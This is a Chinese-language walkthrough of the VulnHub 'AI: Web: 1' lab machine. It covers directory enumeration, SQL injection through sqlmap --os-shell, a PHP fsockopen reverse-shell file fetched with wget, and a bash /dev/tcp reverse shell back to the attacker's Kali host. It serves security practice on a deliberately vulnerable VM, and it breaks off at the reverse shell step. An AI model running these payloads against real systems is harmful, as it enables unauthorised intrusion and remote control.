## vulnhub靶场ai-web 1.0

配置环境 windows11 vmware 17.5 kali

靶机下载地址[AI: Web: 1 ~ VulnHub](https://www.vulnhub.com/entry/ai-web-1,353/)

![image-20231114183047625](http://111.229.225.13:81/i/2023/11/14/u9vijx-2.png)

我选的是这个，然后下载完成后解压，使用VMware选择打开虚拟机点击解压后的文件夹，可以找到对应的文件，然后选择复制此虚拟机，（选移动的话有个bug）

现在开始靶场练习

![image-20231114183418652](http://111.229.225.13:81/i/2023/11/14/uc1s8y-2.png)

攻击机：kali  ip:192.168.31.131

首先kali使用

```bash
arp-scan -l
```

命令查看所处的主机

![image-20231114183927023](http://111.229.225.13:81/i/2023/11/14/uf2ja9-2.png)

可以发现靶机ip为192.168.31.132 

尝试访问此地址

![image-20231114184131060](http://111.229.225.13:81/i/2023/11/14/uga50c-2.png)

这里采用kali自带的dirb url 命令去探测目录

```bash
dirb http://192.168.31.132  
```

![image-20231114184449226](http://111.229.225.13:81/i/2023/11/14/ui6gi8-2.png)

找到三个地址 

第一个已经访问过了，第三个403，所以先看看第二个

![image-20231114184743434](http://111.229.225.13:81/i/2023/11/14/ujxb4o-2.png)

这里顺带说明一下（robots.txt文件是为了遵循爬虫协议，在这里面定义的路径，表示不希望被爬虫爬取）

尝试直接访问，发现都是403，这里再次使用dirb命令探测一下目录

```bash
dirb http://192.168.31.132/m3diNf0/
```

![image-20231114185042175](http://111.229.225.13:81/i/2023/11/14/ulp7bw-2.png)

访问一下

![image-20231114185119984](http://111.229.225.13:81/i/2023/11/14/um65ep-2.png)

phpinfo暴露一些敏感信息，观察此页面

可以得到的信息有：

- 网站架构  ubuntu apache mysql
- 绝对路径   /home/www/html/web1x443290o2sdf92213
- 敏感配置  open_basedir 未完成关闭

再接着对/se3reTdir777/uploads/ 进行dirb

```bash
dirb http://192.168.31.132/se3reTdir777/uploads/
```

没有结果尝试对上一级目录扫描

```bash
dirb http://192.168.31.132/se3reTdir777/
```

![image-20231114190515843](http://111.229.225.13:81/i/2023/11/14/viahgi-2.png)

扫到一个新的url，访问一下

![image-20231114190753463](http://111.229.225.13:81/i/2023/11/14/vjq11t-2.png)

有时候可能会出现bug,例如mysql无法访问之类的，这里建议关机重启，或者直接删掉，再弄一次

输入1‘，后报错,熟悉的sql注入来了

![image-20231114190933015](http://111.229.225.13:81/i/2023/11/14/vks6yv-2.png)

这里直接上sqlmap，主要sql注入确实没学好

我是采用bp抓post包然后使用sqlmap -r post,txt 

![image-20231114191542336](W:\MyNote\cyber_security\靶场\vulnhub\vulnhub靶场ai-web 1.0\image-20231114191542336.png)

copy to file

然后使用命令

```python
python sqlmap.py -r "post.txt" --level=3 --dbs
```

看看能否暴数据库

![image-20231114193607645](http://111.229.225.13:81/i/2023/11/14/w0p9qx-2.png)

目前得知的条件有

- 网站绝对路径
- 可暴数据库

尝试sqlmap 注入拿shell

```
python sqlmap.py -r "post.txt" --level=3 --os-shell
```

![image-20231114194355154](http://111.229.225.13:81/i/2023/11/14/w55z6a-2.png)

这里输入之前的网络根地址，还需要一个可以写入的文件，这里将之前的目录一个个尝试

/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/

发现此目录可以写入

![image-20231114194719191](http://111.229.225.13:81/i/2023/11/14/w7ben1-2.png)

输入whoami 和 id 命令查看权限

![image-20231114194819608](http://111.229.225.13:81/i/2023/11/14/w7x0i4-2.png)

网站权限，同时也说明具有写入权限

尝试提权

这里采用反弹shell

相关文章[反弹Shell的方式和详解_powershell 反弹shell-CSDN博客](https://blog.csdn.net/Aaron_Miller/article/details/106825087)

首先使用

```bash
nc -lvp 8888 #端口号可以自拟
```

然后再开一个终端创建一个php文件

```php
<?php
$sock=fsockopen("192.168.31.131",8888); //ip地址填写自己攻击机的ip
exec("/bin/sh -i <&3 >&3 2>&3");
?>

```

并且在终端位置开启vps（服务器）服务，这里使用python搭建

```python
python -m http.server 8848 #端口号随意
```

![image-20231114202250808](http://111.229.225.13:81/i/2023/11/14/xg5xiu-2.png)

![image-20231114202412616](http://111.229.225.13:81/i/2023/11/14/xh4jp4-2.png)

![image-20231114203306322](http://111.229.225.13:81/i/2023/11/14/xmg5lf-2.png)

```bash
wget -S http://192.168.31.131:8848/2.php
```

使用此命令控制靶机下载刚刚写的1.php文件

![image-20231114203249468](http://111.229.225.13:81/i/2023/11/14/xm41zt-2.png)

```
bash -i >& /dev/tcp/192.168.31.131/8888 0>&1
```

![image-20231115093119661](http://111.229.225.13:81/i/2023/11/15/fehbgk-2.png)

 